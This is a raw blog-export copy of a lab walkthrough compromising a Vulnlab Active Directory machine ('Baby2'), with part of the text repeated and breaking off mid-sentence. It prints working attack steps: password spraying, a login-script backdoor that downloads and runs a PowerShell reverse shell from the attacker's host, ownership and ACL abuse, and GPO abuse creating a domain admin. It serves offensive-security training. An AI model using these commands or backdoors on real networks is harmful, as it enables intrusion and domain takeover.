class=\"line\">  Mohammed.Harris                     D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  Nicola.Lamb                         D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  Ryan.Jenkins                        D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t6126847 blocks of size 4096. 2005567 blocks available</span><br></pre></td></tr></table></figure>\n\n<p>I made a one-liner that should take all of these usernames from the SMB session and convert it into a list of usernames.<br><code>smbclient -c &#39;ls&#39; \\\\\\\\10.10.102.12\\\\homes -N | awk &#39;&#123;print $1&#125;&#39; | grep [A-Za-z] &gt; ul.txt</code></p>\n<p>With our list of usernames, let’s test to see if any of these users are vulnerable to Kerberoasting or ASREPRoasting. We’ll try and use the <code>Guest</code> user with no credentials since we don’t currently have any valid passwords.<br><code>impacket-GetNPUsers -dc-ip 10.10.102.12 -dc-host dc.baby.vl -usersfile ul.txt -request -no-pass BABY2/&#39;Guest&#39;</code><br><code>impacket-GetUserSPNs -dc-ip 10.10.102.12 -dc-host dc.baby.vl -usersfile ul.txt BABY2/&#39;Guest&#39; -no-pass</code></p>\n<p>Unfortunately, neither seem to produce any valid results.</p>\n<h1 id=\"Credential-Reusage\"><a href=\"#Credential-Reusage\" class=\"headerlink\" title=\"Credential Reusage\"></a>Credential Reusage</h1><p>Another test that I learned how to do in one of the previous HTB machines that I practiced against is testing for username&#x2F;password reusage - which is essentially just seeing if users are using their username as their password. This is generally the case when testing OT infrastructure, however let’s give it a try here.</p>\n<p>We can use crackmapexec for the feature along with the user list that we already have. I also added another one-liner for ease-of-use.<br><code>for user in $(cat ul.txt); do crackmapexec smb 10.10.102.12 -u $user -p $(echo $user | tr &#39;[:upper:]&#39; &#39;[:lower:]&#39;); done</code></p>\n<p>The format that the above command references will return any valid credentials with credential reusage, ex: ‘Amelia.Griffiths:amelia.griffiths’.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SMB         10.10.102.12    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.102.12    445    DC               [+] baby2.vl\\library:library</span><br></pre></td></tr></table></figure>\n\n<p>This confirms that the <code>library</code> user is using the same string for both their username and password.</p>\n<p>Now that we have credentials, let’s see if we can access any of the other SMB shares such as <code>docs</code> or <code>apps</code>. We’ll try <code>apps</code> first just to be sure.</p>\n<p><code>smbclient \\\\\\\\10.10.102.12\\\\apps -U &#39;library&#39;</code><br>There seems to be a folder in this share denoted as <code>dev</code>, we’ll access it with <code>cd dev</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\dev\\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Thu Sep  7 15:13:50 2023</span><br><span class=\"line\">  ..                                  D        0  Thu Sep  7 15:12:59 2023</span><br><span class=\"line\">  CHANGELOG                           A      108  Thu Sep  7 15:16:15 2023</span><br><span class=\"line\">  login.vbs.lnk                       A     1800  Thu Sep  7 15:13:23 2023</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t6126847 blocks of size 4096. 2003374 blocks available</span><br></pre></td></tr></table></figure>\n\n<p>Let’s grab both of these with <code>mget *</code> to see what they have. I’m not as interested in the CHANGELOG, more so in the VBS shortcut.</p>\n<h1 id=\"Logon-Script-Exploitation\"><a href=\"#Logon-Script-Exploitation\" class=\"headerlink\" title=\"Logon Script Exploitation\"></a>Logon Script Exploitation</h1><p>Upon opening the <code>login.vbs.lnk</code> shortcut on our local machine, we can see that most of the file is encrypted, however there are some valid strings that point us to another share.<br><code>\\Windows\\SYSVOL\\sysvol\\baby2.vl\\scripts\\login.vbs</code></p>\n<p>We also find the SID of the domain <code>S-1-5-21-213243958-1766259620-4276976267</code></p>\n<p>Let’s access the file and see if there’s anything we can find.<br><code>smbclient \\\\\\\\10.10.102.12\\\\SYSVOL -U &#39;library&#39;</code></p>\n<p>The <code>login.vbs</code> file is within <code>\\baby2.vl\\scripts\\</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Sub MapNetworkShare(sharePath, driveLetter)</span><br><span class=\"line\">    Dim objNetwork</span><br><span class=\"line\">    Set objNetwork = CreateObject(&quot;WScript.Network&quot;)    </span><br><span class=\"line\">  </span><br><span class=\"line\">    [...snip...]</span><br><span class=\"line\">    </span><br><span class=\"line\">    Set objNetwork = Nothing</span><br><span class=\"line\">End Sub</span><br><span class=\"line\"></span><br><span class=\"line\">MapNetworkShare &quot;\\\\dc.baby2.vl\\apps&quot;, &quot;V&quot;</span><br><span class=\"line\">MapNetworkShare &quot;\\\\dc.baby2.vl\\docs&quot;, &quot;L&quot;</span><br></pre></td></tr></table></figure>\n\n<p>This script looks to be mapping the network drives within the SMB instance, at least from first glance. You can see at the end that the SMB shares <code>apps</code> and <code>docs</code> are being mapped to <code>V</code> and <code>L</code> respectively. If this script is a login script that is ran when a user logs in, then we can potentially alter this to give us a reverse shell on the users machine once they log in.</p>\n<p>However what we know now is not enough to justify this, so let’s check to see if bloodhound supports our thought process. I’ll link the same bloodhound materials that I normally use for domain object enumeration.<br><a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a></p>\n<p>We’ll run the python ingestor to dump the LDAP instance and all of its domain objects to a compressed zip archive.<br><code>python3 BloodHound.py/bloodhound.py -d &#39;baby2.vl&#39; -u &#39;library&#39; -p &#39;library&#39; -c all -ns 10.10.102.12 --zip</code></p>\n<p>Once we receive the archive, we can upload it to Bloodhound using the <code>Upload Data</code> function.</p>\n<p>Let’s look at our <code>library</code> user node to see if there are any login scripts that might correspond with the same <code>login.vbs</code> file that we saw prior.</p>\n<p><img src=\"/images/vulnlab/baby2-vl/c.jpg\"></p>\n<p>There doesn’t seem to be anything noteworthy here, however let’s check to see if any other users from our user list have any login scripts present - we’ll start with <code>Amelia.Griffiths</code>.</p>\n<p><img src=\"/images/vulnlab/baby2-vl/d.jpg\"></p>\n<p>We can see here that this user does have a login script enabled, which points to the same <code>login.vbs</code> file within the <code>SYSVOL</code> share that we saw earlier. Now that we have this information, the attack path is relatively clear. All that we need to do is modify this file to include a reverse shell and wait for any users to login (that have the same properties as Amelia Griffiths, or Amelia Griffiths themself).</p>\n<p>In a red-team environment, we would just need to wait for the user log-in. This would just require some patience and could take a day or two, whenever the user next attempts to access their workstation. However since we’re in a lab, I’m assuming that there’s a scheduled task or automated login that logs a user in after a short period of time.</p>\n<p>So let’s modify the script. I’ve included to resources below, a simple PowerShell reverse shell within a text file and a line of text that will trigger this reverse shell within <code>login.vbs</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">CreateObject(&quot;WScript.Shell&quot;).Run &quot;powershell -ep bypass -w hidden IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://10.8.0.173:9001/revshell.txt&#x27;)&quot;</span><br></pre></td></tr></table></figure>\n\n<p>You can add this anywhere in the <code>login.vbs</code> script, I just opted to do it before the SMB shares are mapped at the bottom of the file.</p>\n<p>Next, we’ll make sure that the PowerShell reverse shell that I’ve generated is within the same directory that we’ll be hosting, remember that it’s name is <code>revshell.txt</code> and the LPORT for it is <code>9002</code>, which will point to a netcat listener.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">$LHOST = &quot;10.8.0.173&quot;; $LPORT = 9002; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = [...snip...]$StreamWriter.Write(&quot;$Output`n&quot;); $Code = $null &#125; &#125;; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()</span><br></pre></td></tr></table></figure>\n\n<p>You can generate a similar one from <a href=\"https://www.revshells.com/\">revshells.com</a>, that’s essentially all you’ll need.</p>\n<p>So now all that’s left to do is to delete the existing <code>login.vbs</code> script is <code>SYSVOL</code> and add our modified script to it.</p>\n<p>We’ll also stand up two listeners, one being a Python HTTP server and another being a netcat listener.<br><code>python3 -m http.server 9001</code><br><code>nc -lvnp 9002</code></p>\n<p><code>smbclient -c &#39;cd \\baby2.vl\\scripts\\; rm login.vbs; put login.vbs&#39; \\\\\\\\10.10.102.12\\\\SYSVOL -U &#39;library&#39;</code></p>\n<p>After about a minute or two of waiting, we can see that our file was grabbed by the remote machine from our webserver.<br><code>10.10.102.12 - - [21/May/2024 14:16:02] &quot;GET /revshell.txt HTTP/1.1&quot; 200 -</code></p>\n<p>And we can also see that our reverse shell was executed, and we now have a shell as <code>amelia.griffiths</code>.</p>\n<p><img src=\"/images/vulnlab/baby2-vl/e.jpg\"></p>\n<h1 id=\"Host-Reconnaissance\"><a href=\"#Host-Reconnaissance\" class=\"headerlink\" title=\"Host Reconnaissance\"></a>Host Reconnaissance</h1><p>The user flag was not in it’s ordinary location, which usually is <code>C:\\Users\\(user)\\Desktop\\user.txt</code>, however I found that it was just within the root <code>C:\\</code> drive denoted as <code>C:\\users.txt</code>. This means we have conquered the first half of the machine!</p>\n<p>From here I decided to stand up a Sliver server and ran an implant so I could get an easier shell, since the shell that we landed with is very barebones. I’ve done this before in a few of my other writeups - essentially all I’m doing is starting a listener, generate an implant, and running the implant on the remote machine to receive a session. You can find all the documentation needed to do the above steps <a href=\"https://github.com/BishopFox/sliver\">here</a>.</p>\n<p>So from here we’ll need to move around the domain using our permissions. I couldn’t find specifically anything that <code>Amelia.Griffiths</code> could do from Bloodhound, nor did their permissions seem to be out of the ordinary.</p>\n<p>However you’ll notice that if you run <code>whoami /all</code> with our user, you’ll find that they are a part of two groups that are not regularly enabled by default.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">BABY2\\office    Group            S-1-5-21-213243958-1766259620-4276976267-1104 Mandatory group, Enabled by default, Enabled group</span><br><span class=\"line\">BABY2\\legacy    Group            S-1-5-21-213243958-1766259620-4276976267-2601 Mandatory group, Enabled by default, Enabled group</span><br></pre></td></tr></table></figure>\n\n<p>We can look at both the groups in Bloodhound to see if they have any abnormally configured outbound object controls. The office group didn’t seem to have anything out of the ordinary, however the focal point for our attack path seems to rely on two of the outbound object controls that the <code>legacy</code> group has.</p>\n<p><img src=\"/images/vulnlab/baby2-vl/f.jpg\"></p>\n<h1 id=\"GPO-Object-Control\"><a href=\"#GPO-Object-Control\" class=\"headerlink\" title=\"GPO Object Control\"></a>GPO Object Control</h1><p>It seems that <code>Amelia.Griffiths</code> (who is within the <code>legacy</code> group) has <code>WriteOwner</code> on both the GPO-Management OU and the <code>gpoadm</code> user. To give context on how this works, <code>WriteOwner</code> essentially allows our user to modify the ownership of the object. If we can change the ownership of this object, then we can make the owner of it ourselves. And from there, our ability to abuse the GPOs can allow us to add a new DA of our choosing.</p>\n<p>Furthermore, we can see that the <code>gpoadm</code> user has GenericAll on two GPOs that we can use to create said DAs.</p>\n<p><img src=\"/images/vulnlab/baby2-vl/g.jpg\"></p>\n<p>Not only that, but if we verify who the <code>gpoadm</code> account belongs to by running the below command, we can see that it is controlled by the Domain Admins group.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\amelia.griffiths\\Desktop&gt; Get-ADUser gpoadm | ForEach-Object &#123;Get-ACL &quot;AD:\\$($_.DistinguishedName)&quot; | Select-Object -ExpandProperty Owner&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BABY2\\Domain Admins</span><br></pre></td></tr></table></figure>\n\n<p>So to start, let’s use <code>PowerView</code> to change the owner of the <code>gpoadm</code> user to <code>Amelia.Griffiths</code> using a built-in cmdlet.<br><code>PS C:\\Users\\amelia.griffiths\\Desktop&gt; Set-DomainObjectOwner -Identity gpoadm -OwnerIdentity Amelia.Griffiths</code></p>\n<p>If we run the above <code>Get-ADUser</code> command that we ran earlier, we can see that the owner of the <code>gpoadm</code> account has been changed.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\amelia.griffiths\\Desktop&gt; Get-ADUser gpoadm | ForEach-Object &#123;Get-ACL &quot;AD:\\$($_.DistinguishedName)&quot; | Select-Object -ExpandProperty Owner&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BABY2\\Amelia.Griffiths</span><br></pre></td></tr></table></figure>\n\n<p>Afterwards, we can then add a new ruleset, or ACL, to the <code>gpoadm</code> user to give ourselves GenericAll on the account.<br><code>PS C:\\Users\\amelia.griffiths\\Desktop&gt; Add-DomainObjectACL -PrincipalIdentity Amelia.Griffiths -TargetIdentity gpoadm -Rights All</code></p>\n<p>This in theory should now allow for us to do a multitude of different attacks, most notably changing the users password. While I normally wouldn’t do this in a red-team environment, this should be alright since we’re in a lab.</p>\n<p>That being said, if you do want a little pointer on what you could do that could help keep a low-profile, make sure to check out xct’s writeup on this machine <a href=\"https://www.youtube.com/watch?v=a97PMfOXitY&t=788s&ab_channel=vulnlab\">here</a> (timestamp is 9:08). He utilizes Whisker and Rubeus to create a TGT that essentially acts like a backdoor, allowing you to create shadow credentials that you can use to always be able to log into the box. This can continue to work even if the user changes their password and does NOT change the user’s password.</p>\n<p>Not only that, you can also use the dumped hash that Rubeus will provide in PTH (Pass-the-Hash).</p>\n<p>We could reupload a new Bloodhound dump, but I already know that we have GenericAll on this user. We’d normally be able to use <code>bloodyAD</code> to change the user’s passwords, but that requires us to have valid credentials to <code>Amelia.Griffiths</code>, which we don’t have.</p>\n<p>Luckily enough there is a Window alternative that we can do within our shell as <code>Amelia.Griffiths</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\amelia.griffiths\\Desktop&gt; $newcred = ConvertTo-SecureString &#x27;Password123!&#x27; -AsPlainText -Force</span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Users\\amelia.griffiths\\Desktop&gt; Set-DomainUserPassword gpoadm -AccountPassword $cred</span><br></pre></td></tr></table></figure>\n\n<p>There was no error output, thus we can confirm that the user password for <code>gpoadm</code> has been successfully changed. We can verify this in crackmapexec, but to prevent clutter on the writeup I’ll just show a quick screenshot of it.</p>\n<p><img src=\"/images/vulnlab/baby2-vl/h.jpg\"></p>\n<h1 id=\"GPO-Abuse-as-gpoadm\"><a href=\"#GPO-Abuse-as-gpoadm\" class=\"headerlink\" title=\"GPO Abuse as gpoadm\"></a>GPO Abuse as gpoadm</h1><p>Now, we should be able to abuse either of the two GPOs that <code>gpoadm</code> has control over. We can verify these two GPOs that we saw in our Bloodhound output by running the <code>Get-GPO</code> cmdlet in <code>PowerView</code>.<br><code>PS C:\\Users\\amelia.griffiths\\Desktop&gt; Get-GPO -all</code></p>\n<p>This should return both GPOs that we saw previously, the <code>Default Domain Policy</code> and the <code>Default Domain Controllers Policy</code>.<br>It doesn’t really matter which one we try to abuse, so I’ll use the <code>Default Domain Controllers Policy</code>.</p>\n<p>We can use <code>pyGPOAbuse</code> to essentially automate the exploitation of this GPO. What this tool will do is modify the GPO to create a scheduled task and execute a respective command that will give us a DA to authenticate as. <a href=\"https://github.com/Hackndo/pyGPOAbuse\">https://github.com/Hackndo/pyGPOAbuse</a></p>\n<p>By default, <code>pyGPOAbuse</code> will create a user under the context of <code>john:H4x00r123..</code>, we can also opt to specify a command to be more silent however this is all we’ll probably need for this lab.<br><code>python3 pyGPOAbuse/pygpoabuse.py -dc-ip 10.10.104.215 -gpo-id &quot;6ac1786c-016f-11d2-945f-00c04fb984f9&quot; baby2.vl/gpoadm:&#39;Password123!&#39;</code></p>\n<p>This should create the scheduled task, which will potentially take a while to run.<br>We can circumvent this by forcing the GPO service to restart by running <code>gpupdate /force</code>.</p>\n<p>Now we can test our credentials that the GPO abuse created for us, being <code>john:H4x00r123..</code><br><code>crackmapexec winrm 10.10.104.215 -u &#39;john&#39; -p &#39;H4x00r123..&#39;</code></p>\n<p><img src=\"/images/vulnlab/baby2-vl/i.jpg\"></p>\n<p>Thus, if we log into the WinRM service using <code>evil-winrm</code>, we should be able to authenticate properly.<br><code>evil-winrm -i 10.10.104.215 -u &#39;john&#39; -p &#39;H4x00r123..&#39;</code></p>\n<p><img src=\"/images/vulnlab/baby2-vl/j.jpg\"></p>\n<p>We can now see that we DA privileges since we have all of the permissions listed within <code>whoami /priv</code>.<br>This allows us to read the contents of the Administrator directory and read the root flag, meaning we have completed this machine!</p>\n<p>The root flag is within <code>C:\\Users\\Administrator\\Desktop\\root.txt</code>.</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>I plan on also making a research post about GPO abuse and getting into the nitty gritties of how to exploit it manually rather than doing it through <code>pyGPOAbuse</code>, which from what I’m expecting will probably be through <code>RPCClient</code>. Though I could be wrong. Nonetheless again, big thanks to xct for creating this machine - it definitely helped with a lot of practice and hopefully this writeup did the same for any readers.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://www.revshells.com/\">https://www.revshells.com/</a><br><a href=\"https://github.com/BishopFox/sliver\">https://github.com/BishopFox/sliver</a><br><a href=\"https://www.youtube.com/watch?v=a97PMfOXitY&t=788s&ab_channel=vulnlab\">https://www.youtube.com/watch?v=a97PMfOXitY&amp;t=788s&amp;ab_channel=vulnlab</a><br><a href=\"https://github.com/Hackndo/pyGPOAbuse\">https://github.com/Hackndo/pyGPOAbuse</a></p>\n","cover_type":"img","excerpt":"","more":"<p>This machine was really interesting to get into, as I learned how to practically implement backdoors onto a compromised host as well as GPO abuses and general vulnerability testing in domain accounts. Props to xct for creating this machine.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start with a general NMAP scan of the machine.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-17 21:04 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.102.12</span><br><span class=\"line\">Host is up (0.11s latency).</span><br><span class=\"line\">Not shown: 987 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT      STATE SERVICE</span><br><span class=\"line\">53/tcp    open  domain</span><br><span class=\"line\">88/tcp    open  kerberos-sec</span><br><span class=\"line\">135/tcp   open  msrpc</span><br><span class=\"line\">139/tcp   open  netbios-ssn</span><br><span class=\"line\">389/tcp   open  ldap</span><br><span class=\"line\">445/tcp   open  microsoft-ds</span><br><span class=\"line\">464/tcp   open  kpasswd5</span><br><span class=\"line\">593/tcp   open  http-rpc-epmap</span><br><span class=\"line\">636/tcp   open  ldapssl</span><br><span class=\"line\">3268/tcp  open  globalcatLDAP</span><br><span class=\"line\">3269/tcp  open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp  open  ms-wbt-server</span><br><span class=\"line\">57294/tcp open  unknown</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 19.46 seconds</span><br></pre></td></tr></table></figure>\n\n<p>I also did a bit of more in-depth scans into the different ports with <code>-A</code> and found the DNS name for the machine denoted as <code>dc.baby2.vl</code>.</p>\n<p>This box seems to have similar ports to the original <code>Baby</code> machine, which was an Easy machine that I’ve done before. Since there isn’t a webserver, let’s see if there’s anything we can find initially with SMB.<br><code>smbclient -L 10.10.102.12 -N</code></p>\n<p>This will enumerate all of the SMB shares if we can see them by authenticating with null credentials.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Sharename       Type      Comment</span><br><span class=\"line\">---------       ----      -------</span><br><span class=\"line\">ADMIN$          Disk      Remote Admin</span><br><span class=\"line\">apps            Disk      </span><br><span class=\"line\">C$              Disk      Default share</span><br><span class=\"line\">docs            Disk      </span><br><span class=\"line\">homes           Disk      </span><br><span class=\"line\">IPC$            IPC       Remote IPC</span><br><span class=\"line\">NETLOGON        Disk      Logon server share </span><br><span class=\"line\">SYSVOL          Disk      Logon server share</span><br></pre></td></tr></table></figure>\n\n<p>You’ll see that there are around three shares that are not usually on here - being <code>apps</code>, <code>docs</code>, and <code>homes</code>. This is inherently already a vulnerability, as I should not be allowed to view these shares by default with null credentials. Let’s take a look into the <code>homes</code> directory to start, as the way it sounds this could be the home directories of a few users.<br><code>smbclient \\\\\\\\10.10.102.12\\\\homes -N</code></p>\n<p>In the directory that we land in, you’ll find a list of users and (what we can assume) are their home directories. This is great because we already now have a wordlist to test around with LDAP.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Sat Sep  2 10:45:25 2023</span><br><span class=\"line\">  ..                                  D        0  Tue Aug 22 16:10:21 2023</span><br><span class=\"line\">  Amelia.Griffiths                    D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  Carl.Moore                          D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  Harry.Shaw                          D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  Joan.Jennings                       D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  Joel.Hurst                          D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  Kieran.Mitchell                     D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  library                             D        0  Tue Aug 22 16:22:47 2023</span><br><span class=\"line\">  Lynda.Bailey                        D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  Mohammed.Harris                     D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  Nicola.Lamb                         D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\">  Ryan.Jenkins                        D        0  Tue Aug 22 16:17:06 2023</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t6126847 blocks of size 4096. 2005567 blocks available</span><br></pre></td></tr></table></figure>\n\n<p>I made a one-liner that should take all of these usernames from the SMB session and convert it into a list of usernames.<br><code>smbclient -c &#39;ls&#39; \\\\\\\\10.10.102.12\\\\homes -N | awk &#39;&#123;print $1&#125;&#39; | grep [A-Za-z] &gt; ul.txt</code></p>\n<p>With our list of usernames, let’s test to see if any of these users are vulnerable to Kerberoasting or ASREPRoasting. We’ll try and use the <code>Guest</code> user with no credentials since we don’t currently have any valid passwords.<br><code>impacket-GetNPUsers -dc-ip 10.10.102.12 -dc-host dc.baby.vl -usersfile ul.txt -request -no-pass BABY2/&#39;Guest&#39;</code><br><code>impacket-GetUserSPNs -dc-ip 10.10.102.12 -dc-host dc.baby.vl -usersfile ul.txt BABY2/&#39;Guest&#39; -no-pass</code></p>\n<p>Unfortunately, neither seem to produce any valid results.</p>\n<h1 id=\"Credential-Reusage\"><a href=\"#Credential-Reusage\" class=\"headerlink\" title=\"Credential Reusage\"></a>Credential Reusage</h1><p>Another test that I learned how to do in one of the previous HTB machines that I practiced against is testing for username&#x2F;password reusage - which is essentially just seeing if users are using their username as their password. This is generally the case when testing OT infrastructure, however let’s give it a try here.</p>\n<p>We can use crackmapexec for the feature along with the user list that we already have. I also added another one-liner for ease-of-use.<br><code>for user in $(cat ul.txt); do crackmapexec smb 10.10.102.12 -u $user -p $(echo $user | tr &#39;[:upper:]&#39; &#39;[:lower:]&#39;); done</code></p>\n<p>The format that the above command references will return any valid credentials with credential reusage, ex: ‘Amelia.Griffiths:amelia.griffiths’.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">SMB         10.10.102.12    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:baby2.vl) (signing:True) (SMBv1:False)</span><br><span class=\"line\">SMB         10.10.102.12    445    DC               [+] baby2.vl\\library:library</span><br></pre></td></tr></table></figure>\n\n<p>This confirms that the <code>library</code> user is using the same string for both their username and password.</p>\n<p>Now that we have credentials, let’s see if we can access any of the other SMB shares such as <code>docs</code> or <code>apps</code>. We’ll try <code>apps</code> first just to be sure.</p>\n<p><code>smbclient \\\\\\\\10.10.102.12\\\\apps -U &#39;library&#39;</code><br>There seems to be a folder in this share denoted as <code>dev</code>, we’ll access it with <code>cd dev</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">smb: \\dev\\&gt; ls</span><br><span class=\"line\">  .                                   D        0  Thu Sep  7 15:13:50 2023</span><br><span class=\"line\">  ..                                  D        0  Thu Sep  7 15:12:59 2023</span><br><span class=\"line\">  CHANGELOG                           A      108  Thu Sep  7 15:16:15 2023</span><br><span class=\"line\">  login.vbs.lnk                       A     1800  Thu Sep  7 15:13:23 2023</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t6126847 blocks of size 4096. 2003374 blocks available</span><br></pre></td></tr></table></figure>\n\n<p>Let’s grab both of these with <code>mget *</code> to see what they have. I’m not as interested in the CHANGELOG, more so in the VBS shortcut.</p>\n<h1 id=\"Logon-Script-Exploitation\"><a href=\"#Logon-Script-Exploitation\" class=\"headerlink\" title=\"Logon Script Exploitation\"></a>Logon Script Exploitation</h1><p>Upon opening the <code>login.vbs.lnk</code> shortcut on our local machine, we can see that most of the file is encrypted, however there are some valid strings that point us to another share.<br><code>\\Windows\\SYSVOL\\sysvol\\baby2.vl\\scripts\\login.vbs</code></p>\n<p>We also find the SID of the domain <code>S-1-5-21-213243958-1766259620-4276976267</code></p>\n<p>Let’s access the file and see if there’s anything we can find.<br><code>smbclient \\\\\\\\10.10.102.12\\\\SYSVOL -U &#39;library&#39;</code></p>\n<p>The <code>login.vbs</code> file is within <code>\\baby2.vl\\scripts\\</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Sub MapNetworkShare(sharePath, driveLetter)</span><br><span class=\"line\">    Dim objNetwork</span><br><span class=\"line\">    Set objNetwork = CreateObject(&quot;WScript.Network&quot;)    </span><br><span class=\"line\">  </span><br><span class=\"line\">    [...snip...]</span><br><span class=\"line\">    </span><br><span class=\"line\">    Set objNetwork = Nothing</span><br><span class=\"line\">End Sub</span><br><span class=\"line\"></span><br><span class=\"line\">MapNetworkShare &quot;\\\\dc.baby2.vl\\apps&quot;, &quot;V&quot;</span><br><span class=\"line\">MapNetworkShare &quot;\\\\dc.baby2.vl\\docs&quot;, &quot;L&quot;</span><br></pre></td></tr></table></figure>\n\n<p>This script looks to be mapping the network drives within the SMB instance, at least from first glance. You can see at the end that the SMB shares <code>apps</code> and <code>docs</code> are being mapped to <code>V</code> and <code>L</code> respectively. If this script is a login script that is ran when a user logs in, then we can potentially alter this to give us a reverse shell on the users machine once they log in.</p>\n<p>However what we know now is not enough to justify this, so let’s check to see if bloodhound supports our thought process. I’ll link the same bloodhound materials that I normally use for domain object enumeration.<br><a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a></p>\n<p>We’ll run the python ingestor to dump the LDAP instance and all of its domain objects to a compressed zip archive.<br><code>python3 BloodHound.py/bloodhound.py -d &#39;baby2.vl&#39; -u &#39;library&#39; -p &#39;library&#39; -c all -ns 10.10.102.12 --zip</code></p>\n<p>Once we receive the archive, we can upload it to Bloodhound using the <code>Upload Data</code> function.</p>\n<p>Let’s look at our <code>library</code> user node to see if there are any login scripts that might correspond with the same <code>login.vbs</code> file that we saw prior.</p>\n<p><img src=\"/images/vulnlab/baby2-vl/c.jpg\"></p>\n<p>There doesn’t seem to be anything noteworthy here, however let’s check to see if any other users from our user list have any login scripts present - we’ll start with <code>Amelia.Griffiths</code>.</p>\n<p><img src=\"/images/vulnlab/baby2-vl/d.jpg\"></p>\n<p>We can see here that this user does have a login script enabled, which points to the same <code>login.vbs</code> file within the <code>SYSVOL</code> share that we saw earlier. Now that we have this information, the attack path is relatively clear. All that we need to do is modify this file to include a reverse shell and wait for any users to login (that have the same properties as Amelia Griffiths, or Amelia Griffiths themself).</p>\n<p>In a red-team environment, we would just need to wait for the user log-in. This would just require some patience and could take a day or two, whenever the user next attempts to access their workstation. However since we’re in a lab, I’m assuming that there’s a scheduled task or automated login that logs a user in after a short period of time.</p>\n<p>So let’s modify the script. I’ve included to resources below, a simple PowerShell reverse shell within a text file and a line of text that will trigger this reverse shell within <code>login.vbs</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">CreateObject(&quot;WScript.Shell&quot;).Run &quot;powershell -ep bypass -w hidden IEX (New-Object System.Net.Webclient).DownloadString(&#x27;http://10.8.0.173:9001/revshell.txt&#x27;)&quot;</span><br></pre></td></tr></table></figure>\n\n<p>You can add this anywhere in the <code>login.vbs</code> script, I just opted to do it before the SMB shares are mapped at the bottom of the file.</p>\n<p>Next, we’ll make sure that the PowerShell reverse shell that I’ve generated is within the same directory that we’ll be hosting, remember that it’s name is 